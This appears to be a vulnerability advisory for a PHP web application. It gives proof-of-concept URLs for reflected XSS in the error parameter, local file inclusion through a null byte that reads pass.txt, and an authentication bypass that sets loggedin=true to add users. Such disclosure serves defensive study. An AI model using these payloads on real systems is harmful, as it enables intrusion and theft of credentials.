2) Security Issues
-------------------

--- [ XSS ] ---
===============================================

I think that is better let you see a PoC instead of explain where is the bug.. If you want to know it just look at the 
source code.

--- [ PoC ] ---
===============

http://localhost/ft/index.php?page=error&amp;error=&lt;b&gt;...&lt;/b&gt;
http://localhost/ft/index.php?page=error&amp;error=&lt;script&gt;alert(1)&lt;/script&gt;


--- [ Local File Inclusion ] ---
================================

Take a look in index.php, line 49:
include(&quot;$page.php&quot;);

Remembe that you have to log in to made local file inclusion (loggedin = true -&gt; register_global = On)

[ Remembe that ]
if(!is_file($page . &quot;.php&quot;) || (!is_readable($page . &quot;.php&quot;))) {
		$page = &quot;error&quot;;
		$error = &quot;Page does not exist or is not readable\n&quot;;
	}
}
[ /Remembe that ]

--- [ PoC ] ---
===============

http://localhost/ft/index.php?page=pass.txt%00&amp;loggedin=true

To see pass.txt ...

--- [ Admin Bypass ] ---
================================

Today I'm too lazy to explain what's wrong.. so take a look in the source code and watch the var $loggedin !!

--- [ PoC ] ---
===============

To add a user...

http://localhost/ft/index.php?page=add&amp;loggedin=true
